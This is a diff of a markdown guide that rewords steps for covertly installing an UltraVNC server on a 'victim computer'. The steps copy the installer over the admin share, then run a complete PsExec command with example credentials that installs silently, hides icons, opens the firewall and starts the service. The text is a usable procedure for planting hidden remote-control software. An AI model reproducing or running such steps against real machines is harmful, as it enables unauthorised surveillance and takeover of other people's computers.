@@ -30,15 +30,15 @@ You can remotely view or control the victim computer using the UltraVNC tool. Fo
 
 ## Step 1: Download UltraVNC setup
 
-Download the current version of ultravnc from the website and rename it to uvncsetup.exe.
+Download the current version of ultravnc from the website to your computer and rename it to uvncsetup.exe.
 
-## Step 2: Copy setup to victim 
+## Step 2: Copy uvncsetup.exe to victim computer
 
-Copy the unvcsetup.exe file to the victim's computer's system disk. You can use this path: \\victim\c$\uvncsetup.exe
+Copy the unvcsetup.exe file to the victim's computer's system disk. You can use path '\\victim\c$\' to browse victim computer. 
 
 ## Step 3: Start installation 
 
-To start silent installation on victim computer run uvncsetup.exe as remotely using PsExec.exe below:
+To start silent installation on victim computer run 'uvncsetup.exe' as remotely using PsExec.exe below:
 
 > psexec \\victim -u admin -p admin0 -h -i -c C:\uvncsetup.exe /SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /FORCECLOSEAPPLICATIONS /LOGCLOSEAPPLICATIONS /RESTARTAPPLICATIONS /NOICONS /FIREWALL /NOVIEW /COMPONENTS="ultravnc_server" /TASKS="installservice,startservice" /DIR="%programfiles%\uvnc"
 
